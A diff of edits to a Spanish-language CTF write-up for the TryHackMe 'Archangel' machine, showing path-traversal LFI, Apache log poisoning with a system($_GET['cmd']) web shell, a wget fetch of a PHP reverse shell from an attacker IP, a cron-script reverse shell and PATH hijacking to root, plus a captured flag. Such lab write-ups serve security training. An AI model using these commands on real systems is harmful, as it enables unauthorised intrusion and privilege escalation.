@@ -117,11 +117,11 @@ Puesto que ir haciendo esto para cada comando que se quiera lanzar es un engorro
 
 <code>python3 -m http.server 8000</code>
 
-Por otro lado, se volverá a utilizar la función de ejecucion *system* pero en este caso, en lugar de pasarle directamente el comando, se indicará una variable 'cmd' para que desde la barra del navegador se pueda indicar el comando a lanzar <code>system($_GET['cmd'])</code>. De esta manera, es más ágil que el método que se estaba siguiendo anteriormente. Con <code>wget</code> se procederá a descargar el archivo 'php-reverse-shell.php', indicando la IP de la máquina atacante y el puerto donde se encuentra el servidor creado (8000). De esta manera, el 'acces_log' ejecutará la descarga en la carpeta '/development_testing'. La dirección introducida es la siguiente:
+Por otro lado, se volverá a utilizar la función de ejecucion *system* pero en este caso, en lugar de pasarle directamente el comando, se indicará una variable 'cmd' para que desde la barra del navegador se pueda indicar el comando a lanzar '<code>system($_GET['cmd'])</code>'. De esta manera, es más ágil que el método que se estaba siguiendo anteriormente. Con <code>wget</code> se procederá a descargar el archivo 'php-reverse-shell.php', indicando la IP de la máquina atacante y el puerto donde se encuentra el servidor creado (8000). De esta manera, el 'acces_log' ejecutará la descarga en la carpeta '/development_testing'. La dirección introducida es la siguiente:
 
 <code>http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//../%2fvar%2flog%2fapache2%2faccess.log&cmd=wget%20http://10.23.92.113:8000/php-reverse-shell.php</code>
 
-Para ejecutar la *reverse shell* sólo es necesario indicar la dirección del archivo en la barra *URL*, no sin antes poner en escucha, en nuestra máquina, el puerto '1234' con la herramienta **Netcat**.
+Con la descarga realizada, para ejecutar la *reverse shell* sólo es necesario indicar la dirección del archivo en la barra *URL*, no sin antes poner en escucha, en nuestra máquina, el puerto '1234' con la herramienta **Netcat**.
 
 <code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/php-reverse-shell.php</code>
 
@@ -129,11 +129,11 @@ Para ejecutar la *reverse shell* sólo es necesario indicar la dirección del ar
 
 ![Captura de pantalla 2025-04-25 135922](https://github.com/user-attachments/assets/d1328e57-dad6-48a6-bfe9-6b19c5fee614)
 
-Una vez realizado este *remote control execution* y obtenido el acceso (como usuario www-data), recupero un directorio que había observado anteriormente con *Burp Suite, que no es otro que '/etc/crontab'.
+Una vez realizado este *remote control execution* y obtenido el acceso (como usuario www-data), recupero un directorio que había observado anteriormente con *Burp Suite*, que no es otro que '/etc/crontab'.
 
 <code>GET /test.php?view=/var/www/html/development_testing//..//..//..//..//etc/crontab HTTP/1.1</code>
 
-Este directorio mostraba un *script* llamado 'helloworld.sh' que es ejecutado cada minuto por el usuario Archangel. Se comprueba que desde el usuario actual se puede modificar el contenido de este programa para ejecutar una nueva *reverse shell* que nos permita pivotar al usuario Archangel. Puesto que ya se ha comprobado que en la máquina se encuentra la herramienta de *php*, se utiliza esta para obtener el acceso al nuevo usuario con la ayuda de [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). De esta manera, se cambia el contenido de 'helloworld.sh' por lo siguiente. Además de volver a poner en escucha un puerto en la máquina anfitriona.
+Este directorio mostraba un *script* llamado 'helloworld.sh' que es ejecutado cada minuto por el usuario Archangel. Se comprueba que desde el usuario actual se pueda modificar el contenido de este programa para ejecutar una nueva *reverse shell* que nos permita pivotar al usuario Archangel. Puesto que ya se ha comprobado que en la máquina se encuentra la herramienta de *php*, se utiliza esta para obtener el acceso al nuevo usuario con la ayuda de [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). De esta manera, se cambia el contenido de 'helloworld.sh' por lo siguiente. Además de volver a poner en escucha un puerto en la máquina anfitriona.
 
 <code>#!/bin/bash</code>
 
@@ -141,7 +141,7 @@ Este directorio mostraba un *script* llamado 'helloworld.sh' que es ejecutado ca
 
 ![Captura de pantalla 2025-04-25 142151](https://github.com/user-attachments/assets/1c513e0d-7415-4c90-9ba3-88b8c725925f)
 
-Tras obtener la *shell* de Archangel, se encuentra la siguiente *flag* en el archivo '/home/archangel/user.txt'.
+Tras ejecutarse el programa automáticamente, se obtiene la *shell* de Archangel y se encuentra la siguiente *flag* en el archivo '/home/archangel/user.txt'.
 
 **Flag: thm{lf1_t0_rc3_1s_tr1cky}**
 
@@ -151,7 +151,7 @@ Lo siguiente es dirigirse al directorio '/home/archangel/secret', donde se encue
 
 ![Captura de pantalla 2025-04-25 142544](https://github.com/user-attachments/assets/7cd79b51-6528-4147-8cd7-06a651770c67)
 
-Volviendo al programa 'backup', se intenta leer este con <code>cat</code> pero no se recupera un texto legible. Y puesto que el comando <code>file</code> no es muy esclarecedor se intenta leer los metadatos del archivo con <code>strings</code>. De entre toda la información, se encuentra una linea donde se muestra la copia de unos archivos de un directorio a otro. Puesto que se utiliza el binario <code>cp</code> en lugar de su ruta absoluta, se puede utilizr esto para realizar un **path hijacking** y cambiar la ruta para dirigirlo al archivo que queramos ejecutar.
+Volviendo al programa 'backup', se intenta leer este con <code>cat</code> pero no se recupera un texto legible. Y puesto que el comando <code>file</code> no es muy esclarecedor, se intenta leer los metadatos del archivo con <code>strings</code>. De entre toda la información, se encuentra una linea donde se muestra la copia de unos archivos de un directorio a otro. Puesto que se utiliza directamente el binario <code>cp</code> en lugar de su ruta absoluta, se puede utilizar esto para realizar un **path hijacking** y cambiar la ruta para dirigirlo al archivo que queramos ejecutar.
 
 ![Captura de pantalla 2025-04-25 142800](https://github.com/user-attachments/assets/0ac8abc3-e7ef-494d-b451-84add70c8226)
 
@@ -161,11 +161,11 @@ El primer paso es crear una *script* 'cp' en la carpeta '/home/archangel/secret'
 
 <code>/bin/bash</code>
 
-Siguiente paso es meter esta ruta dentro de la variable PATH, la cual es la que indica donde buscar los binarios para ejecutarlos.
+El siguiente paso es meter la ruta de este *script* dentro de la variable PATH, la cual es la que indica donde buscar los binarios para ejecutarlos.
 
 <code>export PATH=/home/archangel/secret:$PATH</code>
 
-Hecho esto sólo queda ejecutar el archivo 'backup' para que cuando ejecute el <code>cp</code> nos devuelva la *shell* del propietario del archivo, que no es otro que *root*.
+Hecho esto sólo queda ejecutar el archivo 'backup' para que cuando realice el <code>cp</code> nos devuelva la *shell* del propietario del archivo, que no es otro que *root*.
 
 ![Captura de pantalla 2025-04-25 143648](https://github.com/user-attachments/assets/7441a9cf-41f5-4e88-b19c-2837db1537f3)
 
